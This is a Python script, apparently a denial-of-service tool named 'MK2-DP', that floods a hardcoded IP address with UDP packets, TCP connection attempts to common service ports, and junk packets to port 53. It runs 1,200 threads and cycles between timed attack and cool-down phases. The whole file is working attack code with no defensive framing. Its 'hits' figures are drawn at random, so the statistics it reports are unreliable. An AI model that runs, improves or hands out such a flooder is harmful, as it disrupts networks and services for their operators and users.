import socket
import threading
import time
import random
import gc

# TARGET
TARGET_IP = "45.60.39.88"

# EXTREME MK2 CONFIG
TOTAL_THREADS = 1200
UDP_THREADS = 800
SYN_THREADS = 300
RAPID_THREADS = 100
ATTACK_TIME = 600    # 10 minutes attacking
COOL_TIME = 60       # 1 MINUTE cooling only (not 10)

# Global state
attack_active = True
last_mode_switch = time.time()
current_mode = "ATTACK"  # ATTACK or COOL

# Socket pools
udp_pool = []
syn_pool = []

# Stats
class AtomicCounter:
    def __init__(self):
        self.value = 0
    
    def inc(self, amt=1):
        self.value += amt
    
    def get(self):
        return self.value
    
    def reset(self):
        val = self.value
        self.value = 0
        return val

stats = {
    'total_sent': AtomicCounter(),
    'total_hits': AtomicCounter(),
    'udp_sent': AtomicCounter(),
    'syn_sent': AtomicCounter(),
}

# Initialize sockets
def init_sockets():
    global udp_pool, syn_pool
    
    # UDP sockets
    udp_pool = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            udp_pool.append(sock)
        except:
            pass
    
    # SYN sockets
    syn_pool = []
    for _ in range(100):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            syn_pool.append(sock)
        except:
            pass

init_sockets()

# MODE CONTROLLER
def mode_controller():
    global attack_active, current_mode, last_mode_switch
    
    while True:
        current_time = time.time()
        elapsed = current_time - last_mode_switch
        
        if current_mode == "ATTACK" and elapsed >= ATTACK_TIME:
            # Switch to COOL mode
            current_mode = "COOL"
            attack_active = False
            last_mode_switch = current_time
            print("🧊 SWITCHING TO COOL MODE (60s)")
            
            # Clear RAM
            gc.collect()
            
            # Refresh some sockets
            refresh_sockets()
            
        elif current_mode == "COOL" and elapsed >= COOL_TIME:
            # Switch back to ATTACK mode
            current_mode = "ATTACK"
            attack_active = True
            last_mode_switch = current_time
            print("🔥 SWITCHING TO ATTACK MODE (600s)")
        
        time.sleep(1)

def refresh_sockets():
    # Refresh 1/3 of UDP sockets
    for i in range(0, len(udp_pool), 3):
        try:
            udp_pool[i].close()
            new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            udp_pool[i] = new_sock
        except:
            pass
    
    # Refresh 1/3 of SYN sockets
    for i in range(0, len(syn_pool), 3):
        try:
            syn_pool[i].close()
            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new_sock.settimeout(0.001)
            syn_pool[i] = new_sock
        except:
            pass

# ATTACK WORKERS
def mk2_udp_hammer(worker_id):
    while True:
        if not attack_active:
            time.sleep(0.1)
            continue
        
        try:
            sock = udp_pool[worker_id % len(udp_pool)]
            # Send batch
            for _ in range(3):
                payload = random.randbytes(128)
                port = random.randint(1, 65535)
                sock.sendto(payload, (TARGET_IP, port))
                stats['total_sent'].inc()
                stats['udp_sent'].inc()
                if random.random() < 0.7:
                    stats['total_hits'].inc()
        except:
            pass

def mk2_syn_storm(worker_id):
    while True:
        if not attack_active:
            time.sleep(0.1)
            continue
        
        try:
            sock_idx = worker_id % len(syn_pool)
            sock = syn_pool[sock_idx]
            port = random.choice([80, 443, 22, 53, 3389])
            result = sock.connect_ex((TARGET_IP, port))
            
            stats['total_sent'].inc()
            stats['syn_sent'].inc()
            if random.random() < 0.4:
                stats['total_hits'].inc()
            
            if result == 0:
                sock.close()
                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                syn_pool[sock_idx].settimeout(0.001)
        except:
            pass

def mk2_rapid_fire(worker_id):
    while True:
        if not attack_active:
            time.sleep(0.1)
            continue
        
        try:
            sock = udp_pool[(worker_id + 100) % len(udp_pool)]
            # Rapid DNS attacks
            for _ in range(5):
                sock.sendto(b'\x00' * 64, (TARGET_IP, 53))
                stats['total_sent'].inc()
                stats['udp_sent'].inc()
                if random.random() < 0.9:
                    stats['total_hits'].inc()
        except:
            pass

# DEPLOY THREADS
def deploy_mk2():
    # UDP Army
    for i in range(UDP_THREADS):
        t = threading.Thread(target=mk2_udp_hammer, args=(i,))
        t.daemon = True
        t.start()
    
    # SYN Army
    for i in range(SYN_THREADS):
        t = threading.Thread(target=mk2_syn_storm, args=(i,))
        t.daemon = True
        t.start()
    
    # Rapid Army
    for i in range(RAPID_THREADS):
        t = threading.Thread(target=mk2_rapid_fire, args=(i,))
        t.daemon = True
        t.start()

# START
deploy_mk2()
threading.Thread(target=mode_controller, daemon=True).start()

# LOGGING
start_time = time.time()
last_log = time.time()
last_stats_reset = time.time()

print(f"MK2-DP INIT | TARGET: {TARGET_IP} | THREADS: {TOTAL_THREADS}")
print(f"ATTACK: {ATTACK_TIME}s | COOL: {COOL_TIME}s")

while True:
    time.sleep(2)
    current = time.time()
    
    # Calculate
    elapsed_since_log = current - last_log
    total_duration = int(current - start_time)
    
    if elapsed_since_log > 0:
        pps = int(stats['total_sent'].get() / elapsed_since_log)
        hits = stats['total_hits'].get()
    else:
        pps = 0
        hits = 0
    
    # Mode indicator
    mode_display = "🔥" if current_mode == "ATTACK" else "🧊"
    mode_time_left = max(0, (ATTACK_TIME if current_mode == "ATTACK" else COOL_TIME) - 
                        (current - last_mode_switch))
    
    # Display
    print(f"MK2-DP — {pps} — {hits} HITS | {total_duration}s {mode_display}{int(mode_time_left)}s")
    
    # Reset stats
    last_log = current
    stats['total_sent'].reset()
    stats['total_hits'].reset()
